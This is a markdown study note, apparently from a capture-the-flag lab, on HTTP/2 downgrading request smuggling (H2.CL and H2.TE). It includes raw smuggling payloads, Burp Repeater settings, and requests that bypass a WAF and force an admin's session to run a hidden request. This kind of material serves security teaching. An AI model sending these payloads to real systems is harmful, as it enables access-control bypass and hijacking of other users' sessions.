# 🔄 HTTP/2 Downgrading Attacks

## What Is HTTP/2 Downgrading?

```
┌────────┐  HTTP/2   ┌───────────────┐  HTTP/1.1  ┌────────────┐
│ Client │ ────────> │ Reverse Proxy │ ─────────> │ Web Server │
└────────┘           └───────────────┘            └────────────┘
```

The reverse proxy:
1. Receives HTTP/2 from client
2. **Rewrites** to HTTP/1.1 for backend
3. Rewrites HTTP/1.1 responses back to HTTP/2

### Why Does This Happen?

| Reason | Description |
|--------|-------------|
| **Legacy backend** | Web server doesn't support HTTP/2 |
| **Misconfiguration** | Admin unaware of default behavior |
| **Default settings** | Proxy defaults to HTTP/1.1 backend |
| **Mixed infrastructure** | Different software versions |

---

## H2.CL Vulnerability

### The Problem

HTTP/2 RFC states:
> A request or response that includes a payload body **can include** a content-length header field.

If reverse proxy:
1. Accepts `Content-Length` header in HTTP/2
2. **Doesn't validate** it matches actual body
3. Uses faulty CL when rewriting to HTTP/1.1

→ **Request smuggling!**

### Attack Mechanism

**Attacker sends HTTP/2 request:**

```
:method         POST
:path           /
:authority      http2.htb
:scheme         https
content-length  0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Proxy rewrites to HTTP/1.1:**

```http
POST / HTTP/1.1
Host: http2.htb
Content-Length: 0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### Result

| Proxy Sees | Backend Sees |
|------------|--------------|
| 1 POST request | 1 POST request |
| Body contains smuggled data | **+ 1 GET request (smuggled!)** |

---

## H2.TE Vulnerability

### The Problem

Even though HTTP/2 RFC says:
> The "chunked" transfer encoding MUST NOT be used in HTTP/2.

Some proxies still accept `Transfer-Encoding` header and use it during rewrite.

### Attack Mechanism

**Attacker sends HTTP/2 request:**

```
:method            POST
:path              /
:authority         http2.htb
:scheme            https
transfer-encoding  chunked

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Proxy rewrites to HTTP/1.1:**

```http
POST / HTTP/1.1
Host: http2.htb
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### Result

Backend uses TE (takes precedence over CL):
- Empty chunk `0` terminates first request
- Smuggled request processed separately

---

## Practical Exploitation - H2.CL

### Scenario

- WAF blocks `reveal_flag=1` parameter
- Need to bypass WAF to reveal flag
- Site uses HTTP/2 with downgrading

### Exploit Request

```http
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Host: http2.htb
```

### Burp Configuration

1. **Uncheck** "Update Content-Length" in Repeater
2. Ensure request sent as **HTTP/2**
3. Set `Content-Length: 0` manually

### With Header Absorption

```http
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Foo: 
```

The `Foo:` header absorbs the next request's first line.

---

## Forcing Admin Action

### Payload

```http
POST / HTTP/2
Host: <TARGET>
Content-Length: 0

GET /admin/index.php?reveal_flag=1 HTTP/1.1
Host: <TARGET>
```

### Execution

1. Send smuggling request
2. Wait ~10 seconds for admin
3. Check if flag was revealed

### TCP Stream After Downgrade

**Proxy view**: Single POST to `/`

**Backend view**:
```http
[Request 1: POST / with empty body]
[Request 2: GET /admin/index.php?reveal_flag=1]  ← Smuggled!
```

When admin visits, their request triggers the smuggled GET with admin's session.

---

## Attack Flow Diagram

```
┌─────────────┐                    ┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │    Proxy    │                    │   Backend   │
└──────┬──────┘                    │  (HTTP/2→1) │                    └──────┬──────┘
       │                           └──────┬──────┘                           │
       │ HTTP/2 POST /                    │                                  │
       │ Content-Length: 0                │                                  │
       │ Body: "GET /admin?flag=1..."     │                                  │
       │─────────────────────────────────>│                                  │
       │                                  │                                  │
       │                                  │ Rewrites to HTTP/1.1             │
       │                                  │ Uses CL: 0 (trusts it!)          │
       │                                  │                                  │
       │                                  │ HTTP/1.1 POST /                  │
       │                                  │ Content-Length: 0                │
       │                                  │─────────────────────────────────>│
       │                                  │                                  │
       │                                  │ Smuggled data left:              │
       │                                  │ "GET /admin?flag=1..."           │
       │                                  │                                  │
       │          [Admin visits site]     │                                  │
       │                                  │                                  │
       │                                  │<──────────────────── Admin GET / │
       │                                  │─────────────────────────────────>│
       │                                  │                                  │
       │                                  │                    Backend sees: │
       │                                  │                    GET /admin?flag=1
       │                                  │                    with admin session!
```

---

## Key Differences from HTTP/1.1 Smuggling

| Aspect | HTTP/1.1 Smuggling | HTTP/2 Downgrading |
|--------|-------------------|-------------------|
| **Protocol** | HTTP/1.1 only | HTTP/2 → HTTP/1.1 |
| **Headers** | CL vs TE ambiguity | Fake CL/TE in HTTP/2 |
| **Binary format** | N/A | Bypassed via downgrade |
| **Detection** | Check for both headers | Check for downgrading |

---

## References

- [PortSwigger - HTTP/2 Request Smuggling](https://portswigger.net/research/http2)
- [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)

